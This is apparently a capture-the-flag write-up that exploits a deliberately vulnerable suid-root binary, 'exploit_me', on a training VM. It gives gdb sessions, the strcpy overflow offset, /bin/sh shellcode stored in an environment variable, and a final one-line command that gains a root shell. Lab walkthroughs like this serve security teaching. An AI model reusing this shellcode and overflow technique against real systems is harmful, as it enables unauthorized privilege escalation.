# ZAZ

## Analyse

There is a suid root bin in home directory 'exploit_me'.

```bash
zaz@BornToSecHackMe:~$ ls -l
total 5
-rwsr-s--- 1 root zaz 4880 Oct  8  2015 exploit_me
drwxr-x--- 3 zaz  zaz  107 Oct  8  2015 mail
```

The executable use unsafe function strcpy. Strcpy write into static buffer from user argument.

```bash
zaz@BornToSecHackMe:~$ ltrace ./exploit_me TOTO
__libc_start_main(0x80483f4, 2, 0xbffff7e4, 0x8048440, 0x80484b0 <unfinished ...>
strcpy(0xbffff6c0, "TOTO")                                                                                      = 0xbffff6c0
puts("TOTO"TOTO
)                                                                                                    = 5
+++ exited (status 0) +++
```

We can put exploit_me in default by giving it an argument of great length

```bash
zaz@BornToSecHackMe:~$ ./exploit_me BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Segmentation fault (core dumped)
zaz@BornToSecHackMe:~$
```

## Exploit

### With unsafe strcpy we can control save eip, so control the flow execution and spanw a shell

#### 1. find eip with https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/ and gdb

```bash
zaz@BornToSecHackMe:~$ gdb ./exploit_me
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/zaz/exploit_me...(no debugging symbols found)...done.
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Starting program: /home/zaz/exploit_me Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x37654136 in ?? ()
(gdb)
```

Save eip is stored in (buffer's address + 140) `[ADDR BUFFER + 140 + SEIP]`

#### 2. Create Shellcode and know where is it

```bash
zaz@BornToSecHackMe:~$ env -i SHELLCODE=$(python -c 'print "\x31\xdb\x31\xd2\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc0\xb0\x0b\xcd\x80"') PWD=$PWD gdb -q $PWD/exploit_me

(gdb) show env
SHELLCODE=1�1�1�Qhn/shh//bi��1��
                                 ̀
PWD=/home/zaz
LINES=83
COLUMNS=181
(gdb) unset env LINES
(gdb) unset env COLUMNS
(gdb) show env
SHELLCODE=1�1�1�Qhn/shh//bi��1��
                                 ̀
PWD=/home/zaz
(gdb) start
Temporary breakpoint 1 at 0x80483f7
Starting program: /home/zaz/exploit_me

Temporary breakpoint 1, 0x080483f7 in main ()
(gdb) x/10s *((char **)environ)
0xbfffffb5:     "PWD=/home/zaz"
0xbfffffc3:     "SHELLCODE=1\333\061\322\061\311Qhn/shh//bi\211\343\061\300\260\v\315\200"
0xbfffffe7:     "/home/zaz/exploit_me"
0xbffffffc:     ""
0xbffffffd:     ""
0xbffffffe:     ""
0xbfffffff:     ""
0xc0000000:     <Address 0xc0000000 out of bounds>
0xc0000000:     <Address 0xc0000000 out of bounds>
0xc0000000:     <Address 0xc0000000 out of bounds>
(gdb) quit
A debugging session is active.

    Inferior 1 [process 2379] will be killed.

Quit anyway? (y or n) y
```

#### 3. Exploit exploit_me

```bash
zaz@BornToSecHackMe:~$ env -i SHELLCODE=$(python -c 'print "\x31\xdb\x31\xd2\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc0\xb0\x0b\xcd\x80"') PWD=$PWD $PWD/exploit_me $(python -c 'print "\x90" * 140 + "\xbf\xff\xff\xc3"[::-1] ')
������������������������������������������������������������������������������������������������������������������������������������������������
# whoami
root
# :D
```